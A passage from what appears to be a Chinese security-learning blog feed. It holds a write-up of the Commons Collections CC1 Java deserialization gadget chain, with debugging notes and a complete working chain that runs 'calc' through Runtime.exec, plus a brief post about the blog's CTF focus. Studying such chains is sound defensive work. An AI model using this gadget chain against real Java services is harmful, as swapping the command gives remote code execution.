memberValue.getValue();</span></span><br><span class="line"><span class="comment">                if (!(memberType.isInstance(value) ||</span></span><br><span class="line"><span class="comment">                      value instanceof ExceptionProxy)) &#123;</span></span><br><span class="line"><span class="comment">                    memberValue.setValue(</span></span><br><span class="line"><span class="comment">                        new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line"><span class="comment">                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span></span><br><span class="line"><span class="comment">                                annotationType.members().get(name)));</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">            这里发现setValue由内到外被if-if-for包裹，所以这里要满足两个if并且至少执行一次for循环。那么我们由外到内逐一解决。</span></span><br><span class="line"><span class="comment">                for要执行一次，那么memberValues不为null，向上找其构造器。</span></span><br><span class="line"><span class="comment">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span></span><br><span class="line"><span class="comment">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span></span><br><span class="line"><span class="comment">        if (!type.isAnnotation() ||</span></span><br><span class="line"><span class="comment">            superInterfaces.length != 1 ||</span></span><br><span class="line"><span class="comment">            superInterfaces[0] != java.lang.annotation.Annotation.class)</span></span><br><span class="line"><span class="comment">            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span></span><br><span class="line"><span class="comment">        this.type = type;</span></span><br><span class="line"><span class="comment">        this.memberValues = memberValues;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">            AnnotationInvocationHandler方法实现了memberValues赋值，我们可进行调用进行赋值，但是这个AnnotationInvocationHandler类没有被任何修饰符修饰，我们无法AnnotationInvocationHandler.AnnotationInvocationHandler(...)进行调用，只能在package sun.reflect.annotation;进行包内调用</span></span><br><span class="line"><span class="comment">            但是我们可以通过反射调用。</span></span><br><span class="line"><span class="comment">                参数memberValues弄好之后就是第一个if，memberType不为空即可进入，调试发现annotationType = AnnotationType.getInstance(type);     type:&quot;interface java.Lang.Override&quot;</span></span><br><span class="line"><span class="comment">            type:&quot;interface java.Lang.Override&quot;是我们传进去的Override.class，跟进发现public @interface Override &#123;&#125;为空，不可进入if，查找其他Annotation注解，Target、Retention、Repeatable都可以</span></span><br><span class="line"><span class="comment">                第二个if在调试的时候直接进入了</span></span><br><span class="line"><span class="comment">            if-if-for绕过之后执行，发现没有弹出calc，调试发现Runtime.getRuntime()没有被传进去，原因是在AnnotationInvocationHandler最后的setValue传进去的参数是固定的，我们无法控制，怎么办？凉拌炒鸡蛋</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//            InvokerTransformer invokerTransformer = new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                    &quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                    new Class[]&#123;String.class&#125;,</span></span><br><span class="line"><span class="comment">//                    new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">////            invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line"><span class="comment">//            Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//            HashedMap map = new HashedMap();</span></span><br><span class="line"><span class="comment">//            Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,invokerTransformer);</span></span><br><span class="line"><span class="comment">//            map.put(&quot;value&quot;,&quot;b&quot;);</span></span><br><span class="line"><span class="comment">////            for (Map.Entry&lt;Object,Object&gt; entry : transformedmap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">////                entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">////            &#125;</span></span><br><span class="line"><span class="comment">//            Class c_AnnotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//            Constructor cons_AnnotationInvocationHandler = c_AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);</span></span><br><span class="line"><span class="comment">//            cons_AnnotationInvocationHandler.setAccessible(true);</span></span><br><span class="line"><span class="comment">//            Object o = cons_AnnotationInvocationHandler.newInstance(Retention.class, transformedmap);//其他文章用的Target注解，但是我发现Retention和Repeatable注解当中都有value，所以我采用了Retention</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            serialize(o);</span></span><br><span class="line"><span class="comment">//            unserialize(&quot;D:\\Download\\CC\\c1\\cc1.txt&quot;);</span></span><br><span class="line"><span class="comment">//==========================================================</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            在上一步的代码当中我们的参数会在AnnotationInvocationHandler类最后的setValue固定，导致我们在TransformedMap类的value不是Runtime.getRuntime().</span></span><br><span class="line"><span class="comment">            protected Object checkSetValue(Object value) &#123;</span></span><br><span class="line"><span class="comment">                    return valueTransformer.transform(value);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            如果有一种东西（这里称为x，x当中含有.transform(value2)），x.tansform(value)当中的tansform(value)没有用，value可以为任意东西，返回的是x当中的transform(value2),那不是同样可以调用invokerTransformer吗？</span></span><br><span class="line"><span class="comment">            这种东西确实存在就是ChainedTransformer类下的ChainedTransformer方法和transform方法</span></span><br><span class="line"><span class="comment">                        public class ChainedTransformer implements Transformer, Serializable &#123;</span></span><br><span class="line"><span class="comment">                            public ChainedTransformer(Transformer[] transformers) &#123;</span></span><br><span class="line"><span class="comment">                                super();</span></span><br><span class="line"><span class="comment">                                iTransformers = transformers;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                            public Object transform(Object object) &#123;</span></span><br><span class="line"><span class="comment">                                for (int i = 0; i &lt; iTransformers.length; i++) &#123;</span></span><br><span class="line"><span class="comment">                                    object = iTransformers[i].transform(object);</span></span><br><span class="line"><span class="comment">                                &#125;</span></span><br><span class="line"><span class="comment">                                return object;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line"><span class="comment">//            Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//            ConstantTransformer constantTransformer = new ConstantTransformer(runtime);</span></span><br><span class="line"><span class="comment">//            InvokerTransformer invokerTransformer = new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                    &quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                    new Class[]&#123;String.class&#125;,</span></span><br><span class="line"><span class="comment">//                    new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//            ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">//                    constantTransformer,</span></span><br><span class="line"><span class="comment">//                    invokerTransformer</span></span><br><span class="line"><span class="comment">//            &#125;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            HashedMap map = new HashedMap();</span></span><br><span class="line"><span class="comment">//            Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,chainedTransformer);</span></span><br><span class="line"><span class="comment">//            map.put(&quot;value&quot;,&quot;b&quot;);</span></span><br><span class="line"><span class="comment">//            Class c_AnnotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//            Constructor cons_AnnotationInvocationHandler = c_AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);</span></span><br><span class="line"><span class="comment">//            cons_AnnotationInvocationHandler.setAccessible(true);</span></span><br><span class="line"><span class="comment">//            Object o = cons_AnnotationInvocationHandler.newInstance(Retention.class, transformedmap);//其他文章用的Target注解，但是我发现Retention和Repeatable注解当中都有value，所以我采用了Retention</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            serialize(o);</span></span><br><span class="line"><span class="comment">//            unserialize(&quot;D:\\Download\\CC\\c1\\cc1.txt&quot;);</span></span><br><span class="line"><span class="comment">//==========================================================</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            最后发现java.io.NotSerializableException: java.lang.Runtime</span></span><br><span class="line"><span class="comment">            Runtime无法被序列化，因为Runtime没有实现序列化接口，那么我们通过我们最上面写道Runtime反射调用calc的代码</span></span><br><span class="line"><span class="comment">                Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);</span></span><br><span class="line"><span class="comment">                Method getRuntimeMethod = c1.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line"><span class="comment">                Object Runtime = getRuntimeMethod.invoke(c1);</span></span><br><span class="line"><span class="comment">                Method m = c1.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">                m.invoke(Runtime,&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">            将其修改</span></span><br><span class="line"><span class="comment">            ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">                    constantTransformer,</span></span><br><span class="line"><span class="comment">                    invokerTransformer</span></span><br><span class="line"><span class="comment">            &#125;);</span></span><br><span class="line"><span class="comment">            为我们的反射Runtime调用calc的代码</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//            Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//            ConstantTransformer constantTransformer = new ConstantTransformer(runtime);</span></span><br><span class="line"><span class="comment">//            InvokerTransformer invokerTransformer = new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                    &quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                    new Class[]&#123;String.class&#125;,</span></span><br><span class="line"><span class="comment">//                    new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="comment">//                    constantTransformer,</span></span><br><span class="line"><span class="comment">//                    invokerTransformer</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">            <span class="type">HashedMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashedMap</span>();</span><br><span class="line">            map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">            Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c_AnnotationInvocationHandler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">cons_AnnotationInvocationHandler</span> <span class="operator">=</span> c_AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            cons_AnnotationInvocationHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> cons_AnnotationInvocationHandler.newInstance(Retention.class, transformedmap);<span class="comment">//其他文章用的Target注解，但是我发现Retention和Repeatable注解当中都有value，所以我采用了Retention</span></span><br><span class="line"></span><br><span class="line">            serialize(o);</span><br><span class="line">            unserialize(<span class="string">&quot;D:\\Download\\CC\\c1\\cc1.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:\\Download\\CC\\c1\\cc1.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义反序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><p>反射</p><ul><li><a href="https://xz.aliyun.com/news/8621">https://xz.aliyun.com/news/8621</a></li><li><a href="https://xz.aliyun.com/news/6625#toc-0">https://xz.aliyun.com/news/6625#toc-0</a></li></ul></li><li><p>CC1</p><ul><li><a href="https://blog.csdn.net/weixin_49047967/article/details/134763883">https://blog.csdn.net/weixin_49047967/article/details/134763883</a></li><li><a href="https://xz.aliyun.com/news/12115">https://xz.aliyun.com/news/12115</a></li><li><a href="https://www.freebuf.com/articles/web/410767.html">https://www.freebuf.com/articles/web/410767.html</a></li><li>视频：<ul><li><a href="https://www.bilibili.com/video/BV1A1421q7zj/?spm_id_from=333.337.search-card.all.click&vd_source=1602c1287f78f4bb7a0ff844ebc8dc41">https://www.bilibili.com/video/BV1A1421q7zj/?spm_id_from=333.337.search-card.all.click&amp;vd_source=1602c1287f78f4bb7a0ff844ebc8dc41</a></li><li><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&vd_source=1602c1287f78f4bb7a0ff844ebc8dc41">https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=1602c1287f78f4bb7a0ff844ebc8dc41</a></li></ul></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;涉及知识：Java反射、Java SE和Java EE&lt;/p&gt;
&lt;p&gt;环境搭建可以看结尾参考的文章。&lt;/p&gt;
&lt;p&gt;这里写篇CC只是</summary>
      
    
    
    
    
    <category term="Java CC" scheme="https://thebaobao.github.io/tags/Java-CC/"/>
    
  </entry>
  
  <entry>
    <title>new one</title>
    <link href="https://thebaobao.github.io/2025/10/19/hello-world/"/>
    <id>https://thebaobao.github.io/2025/10/19/hello-world/</id>
    <published>2025-10-19T08:40:24.245Z</published>
    <updated>2025-10-19T09:29:42.027Z</updated>
    
    <content type="html"><![CDATA[<h1 id="old-blog"><a href="#old-blog" class="headerlink" title="old blog"></a>old blog</h1><p>old blog纯粹是摸索，记录的都是自己对于ctf的web和小部分pwn的探索。</p><h1 id="new-blog"><a href="#new-blog" class="headerlink" title="new blog"></a>new blog</h1><p>new blog针对于各种ctf比赛的wp、CVE以及学习进行记录，不再记录知识点。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;old-blog&quot;&gt;&lt;a href=&quot;#old-blog&quot; class=&quot;headerlink&quot; title=&quot;old blog&quot;&gt;&lt;/a&gt;old blog&lt;/h1&gt;&lt;p&gt;old blog纯粹是摸索，记录的都是自己对于ctf的web和小部分pwn的探索。&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
